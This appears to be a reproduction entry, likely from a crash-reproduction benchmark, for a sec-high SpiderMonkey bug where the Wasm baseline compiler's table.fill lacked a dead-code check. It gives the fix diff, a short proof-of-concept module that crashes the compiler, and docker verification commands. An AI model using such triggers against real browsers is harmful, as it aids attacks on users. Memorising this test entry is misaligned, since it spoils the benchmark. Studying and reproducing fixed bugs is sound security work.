# Bugzilla 1908631

**Title:** Wasm baseline compiler missing dead-code check in `table.fill`
**Severity:** sec-high (csectype-bounds)
**Component:** SpiderMonkey — Wasm baseline — `js/src/wasm/WasmBaselineCompile.cpp`
**Fix commit:** `5a54e992206bf047493b1081886b364fe21837d7` ("Bug 1908631: Add missing dead code check in table.fill. r=rhunt", Ben Visness, 2024-07-22)
**Vulnerable revision:** `5a54e992206bf047493b1081886b364fe21837d7~1`
**Reporter:** Christian Holler (:decoder)

## Summary

`BaseCompiler::emitTableFill` consumed operands from the wasm value
stack regardless of whether the surrounding code was already `deadCode_`
(i.e., reached after an `unreachable`). For `table.fill` placed after
an `unreachable` where the stack is empty, the consume violates the
baseline invariant `numval <= stk_.length()` and trips
`MOZ_RELEASE_ASSERT` deep inside the baseline compiler. This was
classified `sec-high (csectype-bounds)` because the same pattern
elsewhere yielded out-of-bounds reads on the value stack array.

## Fix

```cpp
// js/src/wasm/WasmBaselineCompile.cpp
 bool BaseCompiler::emitTableFill() {
   uint32_t tableIndex;
   Nothing nothing;
   if (!iter_.readTableFill(&tableIndex, &nothing, &nothing, &nothing)) {
     return false;
   }
+  if (deadCode_) {
+    return true;
+  }
   IndexType indexType = codeMeta_.tables[tableIndex].indexType();
   ...
```

The other table-* opcodes already had this guard; `table.fill` was
the missing one.

## Trigger (`poc.js`)

```js
const bytes = wasmTextToBinary(`(module
  (table 0 externref)
  (func
    block
      unreachable
      table.fill 0
  )
)`);
try { new WebAssembly.Module(bytes); } catch (e) {}
```

`unreachable` makes the rest of the block dead; the baseline compiler
still descends into `table.fill`, hits an empty stack, and crashes.

## Expected crash

Debug+ASAN: `MOZ_CRASH` / stack-invariant assertion inside the
baseline compiler while compiling `table.fill` in dead code, surfacing
as ASAN abort.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1908631 spidermonkey/1908631
bash spidermonkey/crash_check.sh 1908631
```

Expected: `CONFIMRED: ASAN_CRASH`.
